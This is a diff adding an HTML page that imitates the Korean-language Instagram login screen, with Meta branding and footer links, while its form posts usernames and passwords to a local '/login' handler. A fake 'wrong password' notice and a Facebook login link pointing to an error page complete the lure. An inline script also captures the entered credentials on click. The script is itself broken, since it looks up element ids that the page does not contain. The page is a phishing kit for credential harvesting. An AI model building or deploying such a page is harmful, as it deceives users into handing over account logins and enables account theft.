@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href=".//styles.css">
+    <script type="text/javascript" src="main.js"></script>
+    <link rel="icon" type="image/png" href="./img//insta-fav.ico">
+    <title>로그인 • Instagram</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form method="POST" id="login_form" action="/login" autocomplete="off">
+                    <div class="int-area">
+                        <input name="username" id="username" type="text" autocomplete="off" placeholder="전화번호, 사용자 이름 또는 이메일" required>
+                        <label for="username" class="sr-only">전화번호, 사용자 이름 또는 이메일</label>
+                    </div>
+                    <div class="int-area">
+                        <input name="password" id="password" type="password" autocomplete="off" placeholder="비밀번호" required>
+                        <label for="password" class="sr-only">비밀번호</label>
+                    </div>
+                    <div>
+                        <a><button disabled="true" id="loginbutton" type="submit">로그인</button></a>
+                        <!-- <button disabled="true" type="button" id="loginbutton">로그인</button> -->
+                    </div>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">또는</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img src="img/facebook.png" width="14"/>
+                        <a href="https://www.facebook.com/error">Facebook으로 로그인</a>
+                    </div>
+                    <span id = "wrongpw" class="wrong">잘못된 비밀번호입니다. 다시 확인하세요.</span>
+                    <a href="https://www.instagram.com/accounts/password/reset/">비밀번호를 잊으셨나요?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>계정이 없으신가요?</p>
+                <a href="https://www.instagram.com/accounts/emailsignup/">가입하기</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>앱을 다운로드하세요.</p>
+                <div class="flex justify-content-center">
+                    <a href="https://apps.apple.com/kr/app/instagram/id389801252" target="_blank">
+                        <img src="./img/apple-button1.png">
+                    </a>
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+                        <img src="./img/googleplay-button1.png">
+                    </a>
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="https://about.meta.com/">Meta</a></li>
+            <li><a href="https://about.instagram.com/">소개</a></li>
+            <li><a href="https://about.instagram.com/blog">블로그</a></li>
+            <li><a href="https://about.instagram.com/about-us/careers">채용 정보</a></li>
+            <li><a href="https://help.instagram.com/">도움말</a></li>
+            <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
+            <li><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">개인정보처리방침</a></li>
+            <li><a href="https://help.instagram.com/581066165581870/">약관</a></li>
+            <li><a href="https://www.instagram.com/explore/locations/">위치</a></li>
+            <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
+            <li><a href="https://www.facebook.com/help/instagram/261704639352628">연락처 업로드 & 비사용자</a></li>
+            <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
+        </ul>
+        <p class="copyright">© 2024 Instagram from Meta</p>
+    </footer>
+
+    <script>
+
+        document.addEventListener('DOMContentLoaded', () => {
+            let id = document.getElementById("id");
+            let pw = document.getElementById("pw");
+            let btn = document.getElementById("loginbutton");
+
+
+            btn.addEventListener('click', (event) => {
+                event.preventDefault()
+
+                console.log("id : " + id.value + "\n", "pw : " + pw.value)
+            })
+        })
+
+    </script>
+
+</body>
+</html>
